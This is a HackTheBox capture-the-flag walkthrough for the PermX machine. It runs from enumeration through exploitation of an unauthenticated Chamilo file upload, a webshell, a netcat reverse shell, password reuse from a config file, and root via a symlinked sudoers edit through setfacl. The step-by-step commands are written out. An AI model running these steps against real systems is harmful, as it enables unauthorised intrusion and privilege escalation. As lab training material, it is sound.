## Introduction
This is an easy challenge box on
[HackTheBox](https://app.hackthebox.com/machines/PermX){:target="_blank"}{:rel="noopener noreferrer"}.

> This is what a hint will look like!
{: .prompt-tip }

## Enumeration
### Port Scan
Let's start with a port scan to see what services are
accessible

```bash
rustscan -a VICTIM_IP -- -A -oA scan -sC
```

![scan1](/images/permx/scan1.png)

![scan2](/images/permx/scan2.png)

There are two open ports
- 22: SSH
- 80: HTTP

### Hosts
Since `HTTP` is running on port 80 we should add the box name
to our `/etc/hosts` file

```
VICTIM_IP permx.htb
```

Now we can visit the homepage

![homepage](/images/permx/homepage.png)

There isn't anything interesting on the base site, so we'll
keep searching.

### Subdomains
We have a working domain so let's check for any subdomains

```bash
wfuzz -c --hc 302 -t 50 -u http://permx.htb -H 'Host: FUZZ.permx.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hw 964
```

![subdomains](/images/permx/subdomains.png)

We have a hit! In order to access the page we'll need to add
the subdomain to our `/etc/hosts` file. The entry should look
like this

```
VICTIM_IP permx.htb lms.permx.htb
```

Time to visit the page

![lms homepage](/images/permx/lms-homepage.png)

A login page! Looking closer we can find some service
information

![lms info](/images/permx/lms-info.png)

## Initial Foothold
> Use the internet and find `Chamilo` exploits!
{: .prompt-tip }

Searching around can find this
[github repo](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc){:target="_blank"}{:rel="noopener noreferrer"}
to exploit Chamilo <= 1.11.24

![exploit repo](/images/permx/exploit-repo.png)

According to the exploit description we can upload arbitrary
files to the server without needing authentication. If
we can upload a webshell we can run arbitrary commands on the
server!

Copy the repo onto your machine

```bash
git clone https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc
```

Reading the code or the repo description we see an option
which verifies if a target is vulnerable. It's always good
to verify before running an exploit so let's run a scan

```bash
python3 main.py -u http://lms.permx.htb -a scan
```

![exploit scan](/images/permx/exploit-scan.png)

The target is vulnerable! Run the exploit and the script
will upload a webshell

```bash
python3 main.py -u http://lms.permx.htb -a webshell
```

![webshell name](/images/permx/webshell-name.png)

![webshell path](/images/permx/webshell-path.png)

We're given the webshel path so let's run the `id`
command to verify command execution

```
http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/webshell.php?cmd=id
```

![webshell test](/images/permx/webshell-test.png)

### Reverse Shell
> Experiment with different 
> [reverse shells](https://www.revshells.com/){:target="_blank"}{:rel="noopener noreferrer"}
{: .prompt-tip }

For convenience, we can upgrade our webshell to a reverse
shell. I used the `nc mkfifo` payload with `URL Encoding` from
[revshells.com](https://www.revshells.com/){:target="_blank"}{:rel="noopener noreferrer"}
. 

If you don't know your IP on the network you can run

```bash
hostname -i
```

To catch the reverse shell request setup a listener
```bash
nc -lvnp 4444
```

Then we can run our reverse shell payload through the webshell

![revshell](/images/permx/revshell.png)

`python3` is also on the box so we can upgrade our shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# ctrl + z to background the shell
stty raw -echo && fg
export SHELL=/bin/bash
export TERM=screen
```

## Horizontal Escalation
> What accessible files could have credentials?
{: .prompt-tip }

Now that we're on the machine let's see what other users
have a login shell

```bash
cat /etc/passwd | grep bash
```

![users](/images/permx/users.png)

Our next goal is to become the `mtz` user. There are a lot
of files used to make `chamilo` run so let's dig around for
some configuration files.

Our target file has the path
```bash
/var/www/chamilo/app/config/configuration.php
```

By reading it we can find database credentials
```bash
cat configuration.php | grep db
```

![config creds](/images/permx/config-creds.png)

This gives us access to the `mysql` database! Now we can
dump the database along with any account information. Before
we try to any password hashes, we should check if the password
is reused anywhere.

Try switching to the `mtz` user with the database password
```bash
su mtz
```

![mtz user](/images/permx/mtz-user.png)

We've upgraded! Read the user flag and we can move on

![user flag](/images/permx/user-flag.png)

## Root
> What `sudo` permissions does `mtz` have?

We're a new user so let's check our `sudo` permissions
```bash
sudo -l
```

![sudo perms](/images/permx/sudo-perms.png)
{: .prompt-tip }

We can run a shell script with elevated privileges. Read
the file so we know what we're working with

![shell script](/images/permx/shell-script.png)

There are a few conditionals we'll need to get past but at
the end we'll run the `setfacl` command with `sudo`. By
checking
[GTFOBins](https://gtfobins.github.io/gtfobins/setfacl/){:target="_blank"}{:rel="noopener noreferrer"}
we see a `setfacl` entry. Essentially, we'll be able to
change file permissions. If we can modify a configuration
file like `/etc/sudoers`, we can give ourselves `sudo` permissions!

We have a plan to escalate but we still need to deal with
the shell script. It will take three variables as input and
will fail if the file we're changing the permissions of is
not found under the `/home/mtz` directory. 

Links to the rescue! We can make connections to other files
using the `ln` command. So if we create a link to `/etc/passwd`
in our home directory, manipulating `~/passwd` will edit the
original `/etc/passwd` file. The second conditional prevents
linking the file directly, but there is another small workaround.

By linking the `/etc` directory, we can reference those files
directly! Using all this, we can change the permissions of
`/etc/sudoers` so the `mtz` user can edit it
```bash
ln -s /etc etc
sudo /opt/acl.sh mtz rw /home/mtz/etc/sudoers
```

![sudoers perms](/images/permx/sudoers-perms.png)

Now we just need to edit the `sudoers` file so `mtz` can run
all commands using `sudo`

```
mtz ALL=(ALL:ALL) ALL
```

![sudoers privesc](/images/permx/sudoers-privesc.png)

Save the file and we can get a `root` shell with `su`

![privesc](/images/permx/privesc.png)

Awesome! Now we can read the `root` flag and finish the box

![root flag](/images/permx/root-flag.png)

## Conclusion
Enumerating subdomains revealed a service vulnerable to an
unauthenticated file upload. Uploading a webshell gives
remote code execution and a foothold into the system. Reading
the service's configuration files gives us a database password
that is reused by the `mtz` user. This new user can run a
custom shell script with `sudo` which uses the `setfacl`
command. GTFOBins tells us the `setfacl` command can be used
to edit system file permissions. By creating file links, we
bypass restrictions set in the shell script and gain `root`.
